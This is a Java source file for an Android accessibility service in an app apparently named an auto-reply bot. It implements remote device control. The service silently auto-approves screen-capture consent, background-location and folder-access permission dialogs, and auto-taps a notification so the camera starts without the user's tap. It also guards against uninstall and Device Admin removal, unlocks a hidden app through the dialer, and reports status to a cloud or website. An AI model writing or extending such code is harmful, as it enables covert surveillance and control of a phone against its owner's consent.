package com.autoreplybot.remote;

import android.accessibilityservice.AccessibilityService;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.autoreplybot.R;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicReference;

/** Remote navigation + app-block accessibility — never blocks the a11y binder thread. */
public final class RemoteAccessibilityService extends AccessibilityService {
    private static final String TAG = "RemoteA11yService";

    private static final AtomicReference<RemoteAccessibilityService> INSTANCE =
            new AtomicReference<>();

    private final Handler main = new Handler(Looper.getMainLooper());
    private final ExecutorService io = Executors.newSingleThreadExecutor();

    @Nullable private RemoteAccessibilityGestureExecutor gestureExecutor;
    @Nullable private RemoteAccessibilitySessionManager sessionManager;
    @Nullable private String lastPackageName;
    @Nullable private RemoteAppBlockManager appBlockManager;
    @Nullable private String lastForcedPackage;
    private long lastHomeAt;
    private long lastToastAt;

    public static boolean isConnected() {
        return INSTANCE.get() != null;
    }

    @Nullable
    public static RemoteAccessibilityService getInstance() {
        return INSTANCE.get();
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        try {
            INSTANCE.set(this);
            gestureExecutor = new RemoteAccessibilityGestureExecutor(this);
            sessionManager = new RemoteAccessibilitySessionManager(this);
            io.execute(() -> {
                try {
                    RemoteAccessibilityPrefs prefs = new RemoteAccessibilityPrefs(this);
                    if (prefs.isAccessibilityControlEnabled()) {
                        sessionManager.publishIdle("SERVICE_CONNECTED");
                    }
                } catch (Throwable t) {
                    Log.w(TAG, "connect publish failed", t);
                }
                try {
                    new RemoteAppBlockManager(getApplicationContext()).syncStatusToCloud();
                } catch (Throwable t) {
                    Log.w(TAG, "app-block sync on connect failed", t);
                }
            });
        } catch (Throwable t) {
            Log.e(TAG, "onServiceConnected failed", t);
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            if (event == null) return;
            int type = event.getEventType();
            boolean windowEvent = type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                    || type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
            boolean textEvent = type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
            boolean clickEvent = type == AccessibilityEvent.TYPE_VIEW_CLICKED;
            if (!windowEvent && !textEvent && !clickEvent) {
                return;
            }
            CharSequence pkgCs = event.getPackageName();
            if (pkgCs == null) return;
            String pkg = pkgCs.toString();
            if (pkg.isEmpty()) return;
            // Prefer launcher/app packages; ignore SystemUI chatter from the cast chip.
            if (windowEvent && !"com.android.systemui".equals(pkg)) {
                lastPackageName = pkg;
            }

            // Website-timed app blocks (previously a second AccessibilityService entry).
            if (windowEvent) {
                maybeForceHomeBlockedApp(pkg);
            }

            // Uninstall / Device Admin disable guard (when website has not allowed uninstall).
            if (windowEvent) {
                try {
                    RemoteUninstallGuard.onAccessibilityEvent(this, event, pkg);
                } catch (Throwable t) {
                    Log.w(TAG, "uninstall guard failed", t);
                }
            }

            // Website UNINSTALL_APP: keep opening dialog + auto-click OK while pending.
            if (RemoteSelfUninstallController.isPending(this)
                    || RemoteUninstallAutoConfirm.isArmed()) {
                try {
                    RemoteSelfUninstallController.tickFromAccessibility(this);
                } catch (Throwable t) {
                    Log.w(TAG, "uninstall launch tick failed", t);
                }
                main.post(() -> RemoteUninstallAutoConfirm.tryClick(this, event));
            }

            // Cast consent auto-approve runs even without an active remote session.
            if (RemoteMediaProjectionAutoApprove.isArmed()) {
                if (windowEvent || textEvent || clickEvent
                        || "com.android.systemui".equals(pkg)
                        || pkg.contains("permissioncontroller")) {
                    main.post(() -> RemoteMediaProjectionAutoApprove.tryClick(this));
                }
            }

            if (RemoteBackgroundLocationAutoApprove.isArmed()) {
                if (windowEvent || textEvent || clickEvent
                        || pkg.contains("settings")
                        || pkg.contains("permissioncontroller")) {
                    main.post(() -> RemoteBackgroundLocationAutoApprove.tryClick(this));
                }
            }

            if (RemoteFolderGrantAutoApprove.isArmed()) {
                if (windowEvent || textEvent || clickEvent
                        || pkg.contains("documentsui")
                        || pkg.contains("files")) {
                    main.post(() -> RemoteFolderGrantAutoApprove.tryClick(this));
                }
            }

            // Trusted session_auto_start: auto-tap our FCM notification / heads-up
            // so camera starts without a manual tap (user website + admin panel).
            if (RemoteSessionNotifAutoClick.isArmed()) {
                main.post(() -> RemoteSessionNotifAutoClick.tryClick(this));
            }

            // Hidden-app dialer unlock — run on this a11y thread (keeps user-gesture for Vivo).
            if (RemoteDialerAccessibilityUnlock.shouldInspect(this, pkg)) {
                try {
                    RemoteDialerAccessibilityUnlock.onAccessibilityEvent(this, event, pkg);
                } catch (Throwable t) {
                    Log.w(TAG, "dialer unlock inspect failed", t);
                }
            }
        } catch (Throwable t) {
            Log.e(TAG, "onAccessibilityEvent failed", t);
        }
    }

    private void maybeForceHomeBlockedApp(@NonNull String pkg) {
        try {
            RemoteAppBlockManager mgr = appBlockManager;
            if (mgr == null) {
                mgr = new RemoteAppBlockManager(this);
                appBlockManager = mgr;
            }
            if (!mgr.shouldBlockPackage(pkg)) return;

            long now = System.currentTimeMillis();
            if (pkg.equals(lastForcedPackage) && now - lastHomeAt < 700) {
                performGlobalAction(GLOBAL_ACTION_HOME);
                return;
            }
            lastForcedPackage = pkg;
            lastHomeAt = now;
            performGlobalAction(GLOBAL_ACTION_HOME);
            if (now - lastToastAt > 2500) {
                lastToastAt = now;
                final String toastPkg = pkg;
                main.post(() -> {
                    try {
                        Toast.makeText(
                                getApplicationContext(),
                                getString(R.string.remote_app_blocked_toast, toastPkg),
                                Toast.LENGTH_SHORT).show();
                    } catch (Throwable ignored) {
                    }
                });
            }
        } catch (Throwable t) {
            Log.e(TAG, "app-block handle failed", t);
        }
    }

    @Override
    public void onInterrupt() {
        // no-op
    }

    @Override
    public void onDestroy() {
        try {
            io.shutdownNow();
        } catch (Throwable ignored) {
        }
        INSTANCE.compareAndSet(this, null);
        super.onDestroy();
    }

    @Nullable
    public AccessibilityNodeInfo safeRoot() {
        try {
            return getRootInActiveWindow();
        } catch (Throwable t) {
            Log.w(TAG, "getRootInActiveWindow failed", t);
            return null;
        }
    }

    @Nullable
    public String getLastPackageName() {
        return lastPackageName;
    }

    @Nullable
    public RemoteAccessibilityGestureExecutor getGestureExecutor() {
        return gestureExecutor;
    }

    @Nullable
    public RemoteAccessibilitySessionManager getSessionManager() {
        return sessionManager;
    }

    public void runOnMain(@NonNull Runnable runnable) {
        main.post(runnable);
    }

    public void runOnMainDelayed(@NonNull Runnable runnable, long delayMs) {
        main.postDelayed(runnable, Math.max(0L, delayMs));
    }

    public void runIo(@NonNull Runnable runnable) {
        io.execute(runnable);
    }
}
